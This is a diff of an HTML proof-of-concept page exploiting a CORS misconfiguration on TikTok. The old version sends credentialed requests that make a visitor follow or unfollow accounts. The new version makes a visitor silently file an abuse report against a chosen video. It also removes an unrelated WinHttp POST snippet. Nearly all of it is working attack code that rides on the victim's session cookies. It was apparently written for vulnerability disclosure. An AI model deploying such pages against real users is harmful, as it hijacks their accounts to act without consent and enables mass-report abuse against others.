@@ -3,92 +3,46 @@
 <head>
 <script src=../../jquery-3.4.1.min.js></script>
 </head>
-<title>follow and unfollow the user by misconfig of CORS-tiktok</title>
+<title>The abuse of report feature to the video or comment by misconfig of CORS-tiktok</title>
 <div>
 Hi there,this is a POC for tiktok.
-please visit the website to get the user's public userid:
 <a href="https://www.tiktok.com/node/share/user/@user1017295554868?lang=en">The attacker share information,you can change the name if you want to get the userId</a>
 
 
-<h3>Following the attacker's account</h3>
-<label for="lname">what userId you want follow:</label>
-<input type="text" id="userid" name="userid"><br><br>
-<button id="follow" onclick="follow()">following</button>
-</div>
-</br>
-</br>
-<div>
-<h3>Unfollowing the user's account</h3>
-<label for="lname">what userId you want follow:</label>
-<input type="text" id="uuserid" name="uuserid"><br><br>
-<button id="unfollow" onclick="unfollow()">Unfollowing</button>
+<h3>Abuse of report to user's video（reporting to my test video with other reason）</h3>
+<button id="report" onclick="report()">Unfollowing</button>
+The result of reporting. 
+<textarea id="result" style="width: 200px; height: 150px;"></textarea>
 </div>
 <script>
-	var url = "http://www.yourtarget.com";
-var param = "name=david&age=30";
-var obj = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-obj.Open("POST", url, false);
-obj.Option(4) = 13056;
-obj.Option(6) = false; //false可以不自动跳转，截取服务端返回的302状态。
-obj.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-obj.setRequestHeader("Referer", "http://www.baidu.com");
-obj.Send(param);
-WScript.Echo(obj.responseText);
 	
 	
 	
-	function unfollow(){
+	function report(){
 		var data = {};
-    var uuserid = $("uuserid").val();
-    if(!uuserid){
-      uuserid="6885664767168529410";
-    }
+		data["reason"] = "111";
+		data["object_id"] = "6885621295845772545";
+		data["owner_id"] = "75398519921";
+		data["75398519921"] = "video";
 		$.ajax({
-			    url : 'https://t.tiktok.com/api/commit/follow/user/?aid=1988&type=0&fromWeb=1&user_id='+uuserid,
+			    url : 'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web&referer=&user_agent=Mozilla%2F5.0+(Windows+NT+6.1%3B+Win64%3B+x64%3B+rv:81.0)+Gecko%2F20100101+Firefox%2F81.0&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=zh-CN&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows)&browser_online=true&ac=&timezone_name=Etc%2FGMT-8&page_referer=https:%2F%2Fwww.tiktok.com%2F@user2621822501116%3Flang%3Den&priority_region=&appId=1180&region=KR&appType=t&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6885647817369519617&verifyFp=verify_kghtttjw_OVZcNuGX_du7l_49zD_A8wy_CFAhIFK160S4',
 			    type : 'POST',
+			    dataType:'json',
+			    contentType:'application/json',
+			    data:JSON.stringify(data),
 			    xhrFields: {
 			     withCredentials: true
 			 },
-			    success : function(response, textStatus, jqXhr) {
-				         alert("Unfollow the user on tiktok!");
+			    success : function(data) {
+				         alert("Reporting success!");
+				         $("#result").val(data);
 			    },
 			    error : function(jqXHR, textStatus, errorThrown) {
 				console.log("The error occured: " + textStatus, errorThrown);
 			    },
 			    complete : function() {
 				       console.log("complete");
-			    },
-			headers: {
-			    "Referer":"https://www.tiktok.com/"
-			}
-        });
-	}
-	
-		
-	function follow(){
-		var data = {};
-    var userid = $("userid").val();
-    if(!userid){
-      userid="6885664767168529410";
-    }
-		$.ajax({
-			    url : 'https://t.tiktok.com/api/commit/follow/user/?aid=1988&type=0&fromWeb=1&user_id='+userid,
-			    type : 'POST',
-			    xhrFields: {
-			     withCredentials: true
-			 },
-			    success : function(response, textStatus, jqXhr) {
-				         alert("Unfollow the user on tiktok!");
-			    },
-			    error : function(jqXHR, textStatus, errorThrown) {
-				console.log("The error occured: " + textStatus, errorThrown);
-			    },
-			    complete : function() {
-				       console.log("complete");
-			    },
-			headers: {
-			    "Referer":"https://www.tiktok.com/"
-			}
+			    }
         });
 	}
 	
